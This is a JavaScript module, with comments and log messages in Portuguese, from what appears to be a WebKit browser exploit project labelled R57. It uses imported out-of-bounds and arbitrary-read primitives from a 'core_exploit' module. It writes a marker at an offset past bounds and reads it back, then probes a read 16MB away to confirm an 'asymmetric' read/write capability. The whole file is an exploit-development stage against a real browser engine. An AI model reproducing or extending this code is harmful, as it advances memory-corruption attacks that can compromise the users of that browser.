// js/script3/testArrayBufferVictimCrash.mjs (R57 - Verificação de Leitura Assimétrica)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE = "WebKit_Exploit_R57_AsymmetricReadVerify";

const SAFE_WRITE_OFFSET = 0x7000; // Offset < 32768, que deve funcionar
const RISKY_READ_OFFSET = 0x1000000; // 16MB, para testar o alcance da leitura
const TEST_MARKER = new AdvancedInt64(0xDEADBEEF, 0x1337C0DE);

function safeToHex(value, length = 8) {
    if (value instanceof AdvancedInt64) return value.toString(true);
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    try { return toHex(value); } catch (e) { return String(value); }
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R57() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Verificação de Leitura Assimétrica ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init Asymmetric...`;

    logS3(`--- Fase 0 (Asymmetric): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);
    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed" }; }

    let result = {
        errorOccurred: null,
        write_at_safe_offset_ok: null,
        read_at_safe_offset_ok: null,
        read_at_risky_offset_ok: null,
        notes: ""
    };

    try {
        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        if (!isOOBReady() || typeof arb_read !== 'function' || typeof oob_write_absolute !== 'function') {
            throw new Error("Falha ao preparar ambiente OOB ou primitivas R/W não estão disponíveis.");
        }

        // --- Fase 1: Teste de Escrita em Offset Seguro ---
        logS3(`--- Fase 1 (Asymmetric): Testando escrita em offset seguro (0x${SAFE_WRITE_OFFSET.toString(16)}) ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        try {
            await oob_write_absolute(SAFE_WRITE_OFFSET, TEST_MARKER, 8);
            logS3(`   Escrita em offset seguro BEM-SUCEDIDA.`, "good");
            result.write_at_safe_offset_ok = true;
        } catch (e) {
            logS3(`   ERRO ao escrever em offset seguro: ${e.message}`, "critical");
            result.write_at_safe_offset_ok = false;
            throw e; // Se a escrita segura falhar, não há por que continuar
        }
        await PAUSE_S3(50);

        // --- Fase 2: Teste de Leitura no Offset Seguro (Verificação) ---
        logS3(`--- Fase 2 (Asymmetric): Verificando escrita com leitura em offset seguro ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const value_read_back = await arb_read(new AdvancedInt64(0, SAFE_WRITE_OFFSET), 8);
        if (isAdvancedInt64Object(value_read_back) && value_read_back.equals(TEST_MARKER)) {
            logS3(`   SUCESSO: Valor lido (${value_read_back.toString(true)}) corresponde ao marcador.`, "good");
            result.read_at_safe_offset_ok = true;
        } else {
            logS3(`   FALHA: Valor lido (${safeToHex(value_read_back)}) NÃO corresponde ao marcador.`, "critical");
            result.read_at_safe_offset_ok = false;
            throw new Error("Verificação de leitura/escrita em offset seguro falhou.");
        }
        
        // --- Fase 3: Teste de Leitura em Offset de Risco ---
        logS3(`--- Fase 3 (Asymmetric): Testando alcance de arb_read em offset de risco (0x${RISKY_READ_OFFSET.toString(16)}) ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        try {
            const risky_value = await arb_read(new AdvancedInt64(0, RISKY_READ_OFFSET), 8);
            logS3(`   SUCESSO: arb_read em offset grande NÃO CRASHOU. Valor lido (irrelevante): ${safeToHex(risky_value)}`, "success_major");
            result.read_at_risky_offset_ok = true;
            result.notes = "A primitiva arb_read parece ter longo alcance, enquanto oob_write_absolute é limitado. Temos R/W Assimétrico!";
        } catch (e) {
            logS3(`   ERRO/CRASH ao ler de offset grande: ${e.message}`, "error");
            result.read_at_risky_offset_ok = false;
            result.notes = "A primitiva arb_read parece ser limitada, assim como oob_write_absolute.";
        }

    } catch(e) {
        logS3(`   ERRO na execução do teste de verificação: ${e.message}`, "critical");
        result.errorOccurred = e.message;
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }

    document.title = `${FNAME_CURRENT_TEST_BASE} Final: ${result.notes || result.errorOccurred || "Concluído"}`;
    return result;
}
